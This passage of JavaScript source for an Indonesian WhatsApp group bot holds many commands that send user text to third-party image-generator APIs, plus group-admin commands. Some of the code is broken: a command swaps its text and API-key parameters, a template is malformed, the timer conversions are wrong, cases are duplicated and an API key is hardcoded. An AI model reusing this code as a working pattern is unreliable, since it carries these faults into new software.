                   limitAdd(sender, limit)
                   break
                case 'phcomment':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall&lol*`)
                   var F = body.slice(10)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/phub?apikey=${zeksApikey}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                  itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nhow is it?`, quoted: mek})
                  limitAdd(sender, limit)
                   break                           
         case 'tfire':  
         if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
         if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/tfire?text=${F}&apikey=${zeksApikey}`)                   
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   limitAdd(sender, limit)
                   break             
       case 'ytgol':  
       if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(8)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   limitAdd(sender, limit)
                   break       
       case 't3d':
       if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(5)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   limitAdd(sender, limit)
                   break
       case 'logoa':
       if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall&lol*`)
                   var F = body.slice(7)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   limitAdd(sender, limit)
                   break
       case 'phlogo':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall&lol*`)
                   var F = body.slice(9)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/phlogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'marvel':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall&lol*`)
                   var F = body.slice(8)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'leavest':  
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(9)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break                   
       case 'notewrite':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/nulis?text=${F}&apikey=${zeksApikey}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'neon2':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break                   
       case 'wall':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} itsmevall*`)
                   F = body.slice(6)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/breakwall?apikey=${zeksApikey}&text=${F}`)
                   itsmevall.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it?q`, quoted: mek})
                   break   	
                 case 'bucin':
                    case 'quotebucin':
                    if (isBanned) return reply(mess.ban)
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})    
                    hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
                    itsmevall.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
            break
            case 'setppgrup':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await itsmevall.downloadMediaMessage(encmedia)
   itsmevall.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return grupinv('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await itsmevall.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return grupinv('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   itsmevall.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break
case 'tutuptime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return grupinv(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
itsmevall.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return grupinv(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
itsmevall.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'maker3d': 
if (isBanned) return reply(mess.ban)
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} itsmevall`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break					
					case 'throne': 
					if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply('*Where is the text??*') 
tahta = args.join(" ")
reply(mess.wait)
tahta = await getBuffer(`https://api.zeks.me/api/hartatahta?text=${tahta}&apikey=apivinz`)
itsmevall.sendMessage(from, tahta, image, { quoted:mek,caption:'Here you go' })
break
case 'pubg': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
pubg = args.join(" ")
reply(mess.wait)
pubg = await getBuffer(`https://api.zeks.me/api/pubglogo?text1=PUBG&text2=${pubg}&apikey=apivinz`)
itsmevall.sendMessage(from, pubg, image, { quoted:mek,caption:'Here you go' })
break
case 'smoke': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
smoke = args.join(" ")
reply(mess.wait)
smoke = await getBuffer(`https://api.zeks.me/api/smoketext?text=${smoke}&apikey=apivinz`)
itsmevall.sendMessage(from, smoke, image, { quoted:mek,caption:'Here you go' })
break
case 'bneon': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
bneon = args.join(" ")
reply(mess.wait)
bneon = await getBuffer(`https://api.zeks.me/api/bneon?apikey=apivinz&text=${bneon}`)
itsmevall.sendMessage(from, bneon, image, { quoted:mek,caption:'Here you go' })
break
case 'matrix': 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
matrix = args.join(" ")
reply(mess.wait)
matrix = await getBuffer(`https://api.zeks.me/api/matrix?apikey=apivinz&text=${matrix}`)
itsmevall.sendMessage(from, matrix, image, { quoted:mek,caption:'Here you go' })
limitAdd(sender, limit)
break
case 'gplay': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
gplay = args.join(" ")
reply(mess.wait)
gplay = await getBuffer(`https://api.zeks.me/api/gplaybutton?text=${gplay}&apikey=apivinz`)
itsmevall.sendMessage(from, gplay, image, { quoted:mek,caption:'Here you go' })
break
case 'splay': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
splay = args.join(" ")
reply(mess.wait)
splay = await getBuffer(`https://api.zeks.me/api/splaybutton?text=${splay}&apikey=apivinz`)
itsmevall.sendMessage(from, splay, image, { quoted:mek,caption:'Here you go' })
break
case 'text3d': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
text3d = args.join(" ")
reply(mess.wait)
text3d = await getBuffer(`https://api.zeks.me/api/text3dbox?apikey=apivinz&text=${text3d}`)
itsmevall.sendMessage(from, text3d, image, { quoted:mek,caption:'Here you go' })
break
case 'tfire': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
tfire = args.join(" ")
reply(mess.wait)
tfire = await getBuffer(`https://api.zeks.me/api/tfire?text=${tfire}&apikey=apivinz`)
itsmevall.sendMessage(from, tfire, image, { quoted:mek,caption:'Here you go' })
break
case 'light': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
lithg = args.join(" ")
reply(mess.wait)
lithg = await getBuffer(`https://api.zeks.me/api/lithgtext?text=${lithg}&apikey=apivinz`)
itsmevall.sendMessage(from, lithg, image, { quoted:mek,caption:'Here you go' })
break
case 'wall': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
wall = args.join(" ")
reply(mess.wait)
wall = await getBuffer(`https://api.zeks.me/api/breakwall?apikey=apivinz&text=${wall}`)
itsmevall.sendMessage(from, wall, image, { quoted:mek,caption:'Here you go' })
break
case 'dropair': 
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
dropair = args.join(" ")
reply(mess.wait)
dropair = await getBuffer(`https://api.zeks.me/api/dropwater?apikey=apivinz&text=${dropair}`)
itsmevall.sendMessage(from, dropair, image, { quoted:mek,caption:'Here you go' })
break
case 'logocrs': 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
logocrs = args.join(" ")
reply(mess.wait)
logocrs = await getBuffer(`https://api.zeks.me/api/crosslogo?text=${apivinz}&apikey=logocrs`)
itsmevall.sendMessage(from, logocrs, image, { quoted:mek,caption:'Here you go' })
limitAdd(sender, limit)
break
					case 'tiktok2':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)					
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
limitAdd(sender, limit)
break
case '8bit':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/8bit?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'pornhub':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/pornhub?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'glitch':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/glitch?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'glitch2':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/glitch2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'layered':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/layered?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case '3dsteel':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/3dsteel?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'realistic':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/realistic?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'lionlogo':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/lionlogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'ninjalogo':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/ninjalogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'wolf':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/logowolf?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'wolf2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(6)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/logowolf2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'halloween2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(11)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/halloween2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'marvel':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/marvelstudio?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'marvel2':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/marvelstudio2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'cinematichorror':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(16)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/cinematichorror?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'avengers':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/avengerslogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'wonderfulgraffitiart':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} namalu*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1];
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/wonderfulgraffitiart?apikey=$dhakey}&text=${F}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'graffiti3':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/coolwallgraffiti?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'captainamerica':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(15)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/captainamerica?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
itsmevall.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'girlneko':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/girlneko?apikey=${dhakey}&text=${F1}&text2=${F2}`)
itsmevall.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'sadboy':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/sadboy?apikey=${dhakey}&text=${F1}&text2=${F2}`)
itsmevall.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case "keneki":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/kaneki?apikey=${dhakey}&text=${F1}&text2=${F2}`)
itsmevall.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'rem':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(4)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/rem?apikey=${dhakey}&text=${F1}&text2=${F2}`)
